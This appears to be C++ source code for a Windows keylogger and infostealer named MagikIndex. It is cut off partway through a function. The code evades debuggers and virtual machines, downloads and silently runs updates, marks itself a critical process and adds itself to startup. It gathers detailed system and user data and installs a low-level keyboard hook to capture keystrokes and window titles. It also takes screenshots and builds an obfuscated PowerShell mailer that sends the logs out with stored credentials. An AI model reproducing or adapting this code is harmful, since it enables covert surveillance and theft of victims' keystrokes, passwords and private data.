#include "common.h"
#include "logo.h"

#pragma warning( push )
#pragma warning( disable : 4477 )

int Counter, Counter2;
bool mutex, mutex2;
static Log MyLog;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{

    CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);

    DWORD Tick1 = GetTickCount();
    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();
    srand(RandSeed);

    bool ThrowAwayFlag = false;
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
    /*if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {      //why did i put this here kekw
        RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
        exit(0);
    }*/

    if (DelayExecution) {
        int Divider = 20 , DividedSleep = (DelayTime + rand()%100+10) / Divider;
        //LARGE_INTEGER delay;
        //delay.QuadPart = -10000 * (DividedSleep * 1000);
        //pNtDelayExecution(FALSE, &delay);
        for (int j = 0; j <= Divider; j++) {
            Sleep(DividedSleep);
        }
    }

    if (ShatterAttack) {
        unsigned long ThreadId;
        CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
    }

    bool FirstLog = true;
    if (ScreenGrab) {
        unsigned long ThreadId2;
        CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
    }

    __AsmImpossibleDisassm();
    __AsmJmpSameTarget();

    AntiDBG DebugItem;
    DebugItem.Initialize();
    TrustItems Trust = DebugItem.TrustItem;
    bool TrustTooLow = false;
    if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
        if (QuitIfUntrust) {
            exit(0);
        }
        TrustTooLow = true;                                         
    }else if (Trust.HasActiveInternet && !Trust.IsInVM) {
        std::string VersionFile = CurrentDir + "\\Version.inf";
        std::string UpdatedExe = CurrentDir + "\\MagikIndekkusu.exe";
        std::string UpdateLink;
        VersionDownload:
        URLDownloadToFileA(NULL, HardDecode(GitVersionLink).c_str(), VersionFile.c_str(), 0, NULL);
        SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
        std::ifstream VersionFileIO(VersionFile);
        if (!VersionFileIO.eof()) {
            std::getline(VersionFileIO, UpdateLink, '\n');
            //VersionFile.erase(VersionFile.size() - 1);
            if (strcmp(UpdateLink.c_str(), CurrentVersion ) != 0) {
                std::getline(VersionFileIO, UpdateLink, '\n');
                URLDownloadToFile(NULL, UpdateLink.c_str(), UpdatedExe.c_str(), 0, NULL);
                SetFileAttributesA(UpdatedExe.c_str(), FILE_ATTRIBUTE_HIDDEN); 
                VersionFileIO.close();
                DeleteFileA(VersionFile.c_str());
                VersionFile = "/C timeout 3 /nobreak > Nul & start " + UpdatedExe;
                ShellExecuteA(0, "open", "cmd.exe", VersionFile.c_str(), 0, SW_HIDE);
                FinalExit();
            }
            else {
                VersionFileIO.close();
                DeleteFileA(VersionFile.c_str());
            }
        }else {
            VersionFileIO.close();
            DeleteFileA(VersionFile.c_str());
            if (!ThrowAwayFlag) {
                ThrowAwayFlag = true;
                VersionFileIO.close();
                goto VersionDownload;
            }
            VersionFileIO.close();
        }
    }

    if (IsElevated()) {
        HANDLE hToken;
        LUID luid;
        LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid);
        TOKEN_PRIVILEGES tp;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        tp.PrivilegeCount = 1;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
        AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
        HANDLE ntdll = LoadLibrary("ntdll.dll");
        RtlSetProcessIsCritical SetCriticalProcess;
        SetCriticalProcess = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
        SetCriticalProcess(TRUE, NULL, FALSE);
    }

Log:

    Counter = 0;
    mutex = false;

    MyLog.CreateLog();

    DWORD Tick = GetTickCount();

    std::string VersionText = "MagikIndex ";
    std::string TimeText = "Current Tick:";
    std::string ComputerText = "Host Name:";
    std::string UsernameText = "User Name:";
    std::string PrivilegeText = "Privilege:";
    std::string InternetText = "Internet Status:";
    std::string WidthText = "Screen Width:";
    std::string HeightText = "Screen Height:";
    std::string AspectRatioText = "Aspect Ratio:";
    std::string WindowsText = "Windows Version:";
    std::string OEMText = "OEM Number:";
    std::string CPUNumberText = "Number Of Cores:";
    std::string CPUTypeText = "CPU Type:";
    std::string CPUBrand = "CPU Brand And Model:";
    std::string GPUBrand = "GPU Brand And Model:";
    std::string GenuineText = "Genuine Windows:";
    std::string SlowText = "Low-End CPU:";
    std::string MouseText = "Number Of Mouse Buttons:";
    std::string MonitorText = "Number Of Monitors:";
    std::string LanguageText = "Install Language:";
    std::string CurrencyText = "Install Currency:";
    std::string MiddleEastText = "Middle-East PC:";
    std::string BootText = "Normal Boot:";
    std::string RAMText = "RAM Size:";
    std::string SeedText = "Randomness Seed:";
    std::string CryptText = "Encrypted with ";
    std::string DiskText = "Found partitions:\n";
    std::string IPText = "External IP:";
    std::string OSText = "OS Name:";
    std::string ManufacturerText = "Manufacturer:";
    std::string InstallDateText = "Install Date:";
    std::string SystemDeviceText = "System Device:";
    std::string MotherBoardText = "Motherboard:";
    std::string BIOSText = "BIOS:";
    std::string HDDText = "Hard Disk:";
    std::string DomainText;

    VersionText += CurrentVersion;
    VersionText += IsMajor ? " Major Release - " : " Minor/Dev Release - ";

    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    std::string LogTime = std::to_string(Tick);

    SYSTEMTIME SysTime;
    char TimeBuffer[512];
    ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
    GetLocalTime(&SysTime);

    std::string StartDate = "_________" + VersionText;
    StartDate += std::to_string(SysTime.wDay);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wMonth);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wYear);
    StartDate += "  ";
    StartDate += std::to_string(SysTime.wHour);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wMinute);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wSecond);
    StartDate += "_________\n";

    MyLog.LogItChar(MyLogo);
    MyLog.LogItChar("\n");
    MyLog.LogItChar(StartDate);

    if (!CryptLogs) {
        MyLog.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
        MyLog.LogItChar("Not crypting the logs...");
    }else{
        MyLog.LogItChar("Started in normal mode...");
        CryptText += "Secure Random Key Shift...";
        MyLog.LogItChar(CryptText);
    }

    if (FirstLog) {
        if (Trust.IsResCheck)
            MyLog.LogItChar("Resolution ratio mismatch, trust decreased...");
        if (Trust.IsInVM)
            MyLog.LogItChar("VM Guest specific files found, trust decreased...");
        if (Trust.IsHostingAVM)
            MyLog.LogItChar("VM Host specific files found, trust increased...");
        if (Trust.IsSmallHardDrive)
            MyLog.LogItChar("HardDrive is under the set minimum, trust decreased...");
        if (Trust.IsSmallRAM)
            MyLog.LogItChar("RAM is under the set minimum, trust decreased...");
        if (Trust.IsBeingDebugged)
            MyLog.LogItChar("Process is being debugged, trust decreased...");
        if (Trust.HasOneCore)
            MyLog.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
        if (Trust.HasMultipleMonitors)
            MyLog.LogItChar("Multiple monitor setup found, trust increased...");
        if (Trust.HasBeenTimepatched)
            MyLog.LogItChar("Process has been timepatched, trust decreased...");
        if (Trust.UserIsInactive)
            MyLog.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
        if (Trust.HasActiveInternet)
            MyLog.LogItChar("Active internet connection found, trust increased...");
        if (Trust.Proxied)
            MyLog.LogItChar("Proxy/Fake connection found, trust decreased...");
        if (Trust.HasRunningAntiMalware)
            MyLog.LogItChar("Running Anti-Malware solution found, trust increased...");
        if (Trust.HasMoreThan20Apps)
            MyLog.LogItChar("More than 20 apps installed, trust increased...");
        if (Trust.ExtUserActivity)
            MyLog.LogItChar("No user input in the past 15s, trust decreased...");
    }

    if (TrustTooLow) {
        MyLog.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
        MyLog.LogItChar("Trust factor too low, quitting...");
        MyLog.SendLog();
        FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
    }

    DWORD Size = MAX_LENGTH+1;
    char HostName[MAX_LENGTH+1];
    std::string UserNameT = QueryWMI("SELECT * FROM Win32_ComputerSystem", L"Username", 1);
    std::string::size_type pos1 = std::string(UserNameT).find_last_of("\\/");
    std::string UserName = std::string(UserNameT).substr(pos1+1, UserNameT.size());
    std::string InternetStatusString = "Not connected, error: ";

    DWORD DWFlags;

    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {    //switch between these two ways to check as you see fit, or even use both
    if (InternetGetConnectedState(&DWFlags,NULL)){
        InternetStatusString = "Connected";
    }else{
        InternetStatusString += std::to_string(GetLastError());
        InternetStatusString += ", returned flags: ";
        InternetStatusString += std::to_string(DWFlags);
    }

    GetComputerNameA(HostName,&Size);

    if (FirstLog) {
        MyLog.LogItChar("First log of the session, copying files and adding to startup...");
        FirstSetup();
    }else{
        MyLog.LogItChar("Not the first log of the session, skip copying files...");
    }

    //fetch various System Metrics
    int x1, y1, x2, y2;
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    std::string BootMode = (GetSystemMetrics(SM_CLEANBOOT) != 0) ? "No" : "Yes";
    std::string SlowMachine = (GetSystemMetrics(SM_SLOWMACHINE) != 0) ? "Yes" : "No";
    std::string MiddleEast = (GetSystemMetrics(SM_MIDEASTENABLED) != 0) ? "Yes" : "No";
    double Ratioed = (double)((x2 - x1) / (y2 - y1));
    std::string Width = std::to_string((x2 - x1));
    std::string Height = std::to_string((y2 - y1));
    std::string Monitors = std::to_string(GetSystemMetrics(SM_CMONITORS));
    std::string MouseButtons = std::to_string(GetSystemMetrics(SM_CMOUSEBUTTONS));

    //fetch Windows version using 2 different APIs
    std::string WindowsVersion = "Unknown";
    PBYTE WKSTAPointer;
    WKSTA_INFO_100 WKSTABuf;
    NetWkstaGetInfo(NULL, 100, &WKSTAPointer);
    memcpy(&WKSTABuf, WKSTAPointer, sizeof(WKSTABuf));
    WindowsVersion = IsWindowsXPOrGreater() ? "XP " : WindowsVersion;
    WindowsVersion = IsWindows7OrGreater() ? "7 " : WindowsVersion;
    WindowsVersion = IsWindows7SP1OrGreater() ? "7 SP1 " : WindowsVersion;
    WindowsVersion = IsWindows8OrGreater() ? "8 " : WindowsVersion;
    WindowsVersion = IsWindows8Point1OrGreater() ? "8.1 " : WindowsVersion;
    WindowsVersion = IsWindows10OrGreater() ? "10 " : WindowsVersion;
    WindowsVersion = IsWindowsServer() ?  "Server " : WindowsVersion;
    WindowsVersion += WKSTABuf.wki100_ver_major;
    WindowsVersion += ".";
    WindowsVersion += WKSTABuf.wki100_ver_minor;

    //fetch ram
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    MEMORYSTATUSEX RAMStatus;
    RAMStatus.dwLength = sizeof(RAMStatus);
    GlobalMemoryStatusEx(&RAMStatus);
    std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors/2);
    std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
    std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
    
    //fetch autenthication status
    CONST SLID AppId = WINDOWS_SLID;
    SL_GENUINE_STATE GenuineState;
    std::string IsGenuine = (SLIsGenuineLocal(&AppId, &GenuineState, NULL) == S_OK && GenuineState != SL_GEN_STATE_IS_GENUINE) ? "No" : "Yes";


    //fetch language and currency
    char LanguageIdentifier[100];
    char CurrIdentifier[100];
    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGLANGUAGE, LanguageIdentifier, sizeof(LanguageIdentifier));
    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));

    PrivilegeText += IsElevated() ? "Elevated" : "Standard";

    TimeText += LogTime;
    MyLog.LogItChar(TimeText);

    ComputerText += HostName;
    MyLog.LogItChar(ComputerText);

    UsernameText += UserName;
    MyLog.LogItChar(UsernameText);

    OSText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"Caption",1);
    MyLog.LogItChar(OSText);

    ManufacturerText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"Manufacturer",1);
    MyLog.LogItChar(ManufacturerText);

    InstallDateText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"InstallDate",1);
    MyLog.LogItChar(InstallDateText);

    SystemDeviceText += QueryWMI("SELECT * FROM Win32_OperatingSystem", L"SystemDevice",1);
    MyLog.LogItChar(SystemDeviceText);

    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"Manufacturer",1);
    MotherBoardText += " ";
    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"Product",1);
    MotherBoardText += " ";
    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"Version",1);
    MotherBoardText += " ";
    MotherBoardText += QueryWMI("SELECT * FROM Win32_BaseBoard", L"SerialNumber",1);
    MyLog.LogItChar(MotherBoardText);

    BIOSText += QueryWMI("SELECT * FROM Win32_BIOS", L"Manufacturer",1);
    BIOSText += " ";
    BIOSText += QueryWMI("SELECT * FROM Win32_BIOS", L"Name",1);
    BIOSText += " ";
    BIOSText += QueryWMI("SELECT * FROM Win32_BIOS", L"SerialNumber",1);
    MyLog.LogItChar(BIOSText);

    HDDText += " Model:";
    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"Model",1);
    HDDText += " Path:";
    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"Name",1);
    HDDText += " SN:";
    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"SerialNumber",1);
    HDDText += " Size:";
    HDDText += QueryWMI("SELECT * FROM Win32_DiskDrive", L"Size",2);
    HDDText += "Bytes";
    MyLog.LogItChar(HDDText);

    InternetText += InternetStatusString;
    MyLog.LogItChar(InternetText);

    if (Trust.HasActiveInternet)
        IPText += RetrieveExternalIp(CurrentDir);
    else
        IPText += "Offline";
    MyLog.LogItChar(IPText);

    WidthText += Width;
    MyLog.LogItChar(WidthText);

    HeightText += Height;
    MyLog.LogItChar(HeightText);

    AspectRatioText += std::to_string(Ratioed);
    MyLog.LogItChar(AspectRatioText);

    WindowsText += WindowsVersion;
    MyLog.LogItChar(WindowsText);

    OEMText += OEMNumber;
    MyLog.LogItChar(OEMText);

    RAMText += RAMAmount;
    RAMText += " MB";
    MyLog.LogItChar(RAMText);

    CPUTypeText += CPUType;
    MyLog.LogItChar(CPUTypeText);

	CPUBrand += GetCpuInfo();
	CPUBrand += " x";
	CPUBrand += CPUCores;
	CPUBrand += ", ";
	CPUBrand += QueryWMI("SELECT * FROM Win32_Processor", L"CurrentVoltage", 2);
	CPUBrand += "v, ";
	CPUBrand += QueryWMI("SELECT * FROM Win32_Processor", L"LoadPercentage", 2);
	CPUBrand += "% Load";
	//CPUBrand += QueryWMI("SELECT * FROM Win32_Processor", L"SerialNumber", 1);
    MyLog.LogItChar(CPUBrand);

    GPUBrand += QueryWMI("SELECT * FROM Win32_VideoController", L"Caption", 1);
    MyLog.LogItChar(GPUBrand);

    GenuineText += IsGenuine;
    MyLog.LogItChar(GenuineText);

    MouseText += MouseButtons;
    MyLog.LogItChar(MouseText);

    MonitorText += Monitors;
    MyLog.LogItChar(MonitorText);

    BootText += BootMode;
    MyLog.LogItChar(BootText);

    SlowText += SlowMachine;
    MyLog.LogItChar(SlowText);

    LanguageText += LanguageIdentifier;
    MyLog.LogItChar(LanguageText);

    CurrencyText += CurrIdentifier;
    MyLog.LogItChar(CurrencyText);

    MiddleEastText += MiddleEast;
    MyLog.LogItChar(MiddleEastText);

    SeedText += std::to_string(RandSeed);
    MyLog.LogItChar(SeedText);

    DWORD DriveMask = GetLogicalDrives();

    for (int i = 0; i < 26; i++) {
        std::string DriveLetter = {};
        DriveLetter += (char)(i + (int)'A');
        DriveLetter += ":\\";
        ULARGE_INTEGER DiskSize;
        UINT DriveType = GetDriveTypeA(DriveLetter.c_str());
        //MessageBoxA(NULL,std::to_string(DriveType).c_str(), DriveLetter.c_str(),MB_OK);
        if ((DriveMask & (1 << i))) {
            if (DriveType != DRIVE_UNKNOWN && DriveType != DRIVE_NO_ROOT_DIR) {
                if (GetDiskFreeSpaceExA(DriveLetter.c_str(), NULL, &DiskSize, NULL) || (DriveType != DRIVE_CDROM && DriveType != DRIVE_REMOVABLE)) {
                    DiskText += (char)(i + (int)'A');
                    DiskText += ":\\  Type:";
                    DiskText += std::to_string(DriveType);
                    DiskText += "  Size:";
                    DiskText += std::to_string((DiskSize.QuadPart / 1073741824));
                    DiskText += "GB,\n";
                    DiskSize.QuadPart = 0;
                }
            }
        }
    }
    DiskText.erase(DiskText.size()-2);
    DiskText += "\n";
    MyLog.LogItChar(DiskText);

    MyLog.LogItChar("_____________________________________________\nList of existing users: \n");


    DomainText = QueryWMI("SELECT * from Win32_UserAccount",L"FullName",1);
    MyLog.LogItChar(DomainText);


    MyLog.LogItChar("_____________________________________________\nList of running processes: \n");

    HANDLE hpSnap;
    PROCESSENTRY32 pentry;
    hpSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hpSnap != INVALID_HANDLE_VALUE) {
        pentry.dwSize = sizeof(PROCESSENTRY32);
    }
    else {
        return false;
    }
    if (!Process32First(hpSnap, &pentry)) {
        CloseHandle(hpSnap);
        return false;
    }
    do {
        MyLog.LogItChar(pentry.szExeFile);
    } while (Process32Next(hpSnap, &pentry));

    MyLog.LogItChar("_____________________________________________\nList of device drivers: \n");

    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        char szDriver[1024];
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < cDrivers; i++)
        {
            if (K32GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
            {
                MyLog.LogItChar(szDriver);
            }
        }
    }
    else
    {
        MyLog.LogItChar("Not enough memory for driver enumeration.");
    }

    MyLog.LogItChar("\n_____________________________________________\n");


    std::thread t1(Hooker, WH_KEYBOARD_LL, KeyboardThread);
    std::thread t2(TimerThread);
    t2.detach();
    t1.detach();
    //t1.detach();
    Sleep(50);
    char OldWindowTitle[256];
    char WindowTitle[256];
    while (!mutex) {
        GetWindowTextA(GetForegroundWindow(), WindowTitle, sizeof(WindowTitle));
        if (strcmp(WindowTitle, OldWindowTitle) != 0) {
            memset(OldWindowTitle, 0, sizeof(OldWindowTitle));
            strcpy(OldWindowTitle, WindowTitle);
            std::string ContextSwitchText = "[Switched to \"";
            ContextSwitchText += WindowTitle;
            ContextSwitchText += "\"]";
            MyLog.LogItChar(ContextSwitchText);
            Counter += ContextSwitchText.size();
        }
        Sleep(50);
    }
    MyLog.LogItChar("\n_____________________________________________\n");
    if (LogMode == 2)
        MyLog.LogItChar("Character limit hit, sending log...");
    else if (LogMode == 1)
        MyLog.LogItChar("Timer limit hit, sending log...");

    MyLog.SendLog();
    FirstLog = false;

    goto Log;
    return 0;
}

void DeleteDirectory(std::string dir)
{
    dir += "\0";
    SHFILEOPSTRUCTA file_op = { NULL, FO_DELETE, dir.c_str(), NULL, FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT, false, 0, "" };
    SHFileOperationA(&file_op);
    return;
}

void createTextFile(const std::string& filename, const std::string& line1, const std::string& line2, const std::string& line3) {
	// Create the file with the FILE_ATTRIBUTE_HIDDEN attribute
	HANDLE file = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	// Write the first line to the file
	DWORD writtenBytes;
	WriteFile(file, line1.c_str(), (DWORD)line1.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);

	// Write the second line to the file
	WriteFile(file, line2.c_str(), (DWORD)line2.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);

	// Write the second line to the file
	WriteFile(file, line3.c_str(), (DWORD)line3.size(), &writtenBytes, NULL);
	WriteFile(file, "\r\n", 2, &writtenBytes, NULL);

	// Close the file
	CloseHandle(file);
}

void TakeScreenShot(const char* filename) 
{
    int x1, y1, x2, y2, w, h;

    // get screen dimensions
    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;

    // copy screen to bitmap
    HDC     hScreen = GetDC(NULL);
    HDC     hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, (ScreenshotCrop ? DestWidth : w), (ScreenshotCrop ? DestHeight : h));
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BOOL    bRet = StretchBlt(hDC, x1, y1, (ScreenshotCrop ? DestWidth : w), (ScreenshotCrop ? DestHeight : h), hScreen, x1, y1, w, h, SRCCOPY);

    //include mouse pointer inside the screenshot(if it is displayed)
    HWND hwnd = GetDesktopWindow();
    CURSORINFO cursor = { sizeof(cursor) };
    GetCursorInfo(&cursor);
    if (cursor.flags == CURSOR_SHOWING) {
        RECT rect;
        GetWindowRect(hwnd, &rect);
        ICONINFO info = { sizeof(info) };
        GetIconInfo(cursor.hCursor, &info);
        const int x = cursor.ptScreenPos.x - rect.left - rect.left - info.xHotspot;
        const int y = cursor.ptScreenPos.y - rect.top - rect.top - info.yHotspot;
        BITMAP bmpCursor = { 0 };
        GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
        DrawIconEx(hDC, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight,
            0, NULL, DI_NORMAL);
    }

    SaveHBITMAPToFile(hBitmap, filename);
    //CLEAN
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
};

BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
{
    std::string base64;
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh, hDib, hPal, hOldPal2 = NULL;
    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;
    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;
    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8
        * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal)
    {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }


    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
        + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

    if (hOldPal2)
    {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }

      fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

        if (fh == INVALID_HANDLE_VALUE)
            return FALSE;
    
    bmfHdr.bfType = 0x4D42; // "BM"
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    /*
        base64.append("<img src=\"data:image/jpeg;base64,");
        base64.append((LPSTR)&bmfHdr);
        base64.append((LPSTR)&lpbi);
        cout<< base64;
    */
     WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);

	 WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
    
    GlobalUnlock(hDib);
    GlobalFree(hDib);
    CloseHandle(fh);
    return TRUE;
}

void RunPS1File(const std::string& ZipPath1)
{
	char tempPath[MAX_PATH];
	GetEnvironmentVariable("TEMP", tempPath, MAX_PATH);
	std::string fullPath = tempPath;
	fullPath += "\\mat-debug-"; //change name if suited
	fullPath += std::to_string(rand() % 10000 + 1000);
	fullPath += ".log";
	createTextFile(fullPath, SendersEmail, SendersPsw, ZipPath1);

	std::string Command = "/C powershell ";
	char SysDir[MAX_PATH];
	GetSystemDirectoryA(SysDir, MAX_PATH);
	DWORD WrittenBytes, DWFlags;
	char* AppData = nullptr;
	size_t AppDataSize;
	strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
	_dupenv_s(&AppData, &AppDataSize, "APPDATA");
	std::string Powershell = AppData;
	Powershell += "\\System1";
	Powershell += "\\PSScript";
	Powershell += std::to_string(GetTickCount());
	Powershell += ".PS1";
	std::string PSStartup = "MagikMailer";
	PSStartup += std::to_string(GetTickCount());
	HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	std::string a = "$credsPath = \"";
	a += fullPath;
	a += "\"\n";
	a += HardDecode("2pE2nIgnrygMW4euXoE;rCfrjZ\\MWYdj7mdxnIfjP4d47YUw64drTZ[l;ofQnWgPTEKvXIfL3U\\4;YdnLnEnPoex\\WNiiIfjD3emXoelTEKvXIfL3U\\4;YdnLnEryYcj3YT2L5dyXoWmiE\\wX4Ww:o\\wnGWW32WmqSMqTZ[SDZccTEMmTYSwOJfwXYdqPY[2TZSwyYcj3YT2L5dyXoWmqyLiKZ\\pf4dOD{crfY[PDke3;YYpCURimJ\\xLmNunY[vXGf{;IenLHLMeEgnTodLvYcpHYVpCURiS5[nro[3PnNunY[vXGf{;IenLHLMmEdrHYdnTEMmTYSw:IXwyYcj3YT2L5dyXoWmqCdrHYdnTEK;CUdxLpTwyYcj3YT2L5dyXoWmqS\\pH4e|XYVunY[P7EdrHYVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiyYcj3YT2L5dyXoWmqSMmL5d5P5ejDJLiyEdrHYdnTEMuHYc27Y\\mXoeFvoexfJfn7mN2XoVw2Y\\2PZgVDEflXock;WN5XoVi2FK|zY[rTpdnTY\\{PmNx\\odLDHXPPHLMWYf{TJLi2FKuP5Wnzo[j7YTw:o\\wnGWW32WmqSM5iVPiyken\\penPHe234WmiEfwXYcuPGe234WwyYcj3mN2XoViS5[nro[R3{fn7GK;C{do7YUSTXVVTkEp24dl7EdrHYdp7Ee234epCURiKZ\\4LZ\\VDHXPPHLMupErWodrzodxTEMi[YcMSZ\\rXZWvCUOiSpd3;4SvCEQwilN66EQi64drT5[n7odxPYN2PZ\\2DURiWodrzodxTkEfL|Y|XodrzILi2FKqTZ[SDZccTkEfH|Y|XodrzILi2FKmL5d5P5ejDJLM2HOdPZ\\wnIdmCURiyYcj3Y\\mqCc2HIW|TY\\{PILiSpdnTpdxPWN2X4Ti2FK|XodrzIL");
	
	WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
	CloseHandle(PS1File);
	Command = SysDir;
